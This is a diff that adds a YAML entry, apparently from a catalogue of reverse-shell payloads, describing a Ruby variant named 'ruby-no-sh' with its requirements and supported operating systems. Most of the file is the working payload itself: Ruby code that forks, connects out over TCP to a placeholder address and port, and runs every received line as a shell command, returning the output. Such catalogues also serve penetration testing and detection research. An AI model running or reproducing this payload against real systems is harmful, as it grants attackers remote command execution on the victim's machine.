@@ -1,0 +1,45 @@
+---
+
+###
+### Meta definitions
+###
+specification:
+  payload: code
+  type: revshell
+  version: 0.0.1
+
+
+###
+### Code array
+###
+items:
+
+  - name: ruby-no-sh
+    desc: description
+    info: []
+    rating: 1
+    code:
+      language: ruby
+      requires:
+        version: []
+        commands: []                      # Used shell commands
+        functions: ["puts", "popen", "print", "read", "chomp", "new", "chdir"]
+        modules: ["socket"]
+        os: ["bsd", "linux", "mac"]           # Works on these operating systems
+    revshell:
+      proto: tcp
+      shell: sh
+      command: null
+    payload: |
+      require "socket";
+      exit if fork;
+      c=TCPSocket.new("__ADDR__","__PORT__");
+      loop{
+      c.gets.chomp!;
+      (
+      exit! if $_=="exit"
+      );
+      (
+      $_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read})
+      )rescue c.puts "failed: #{$_}"
+      }
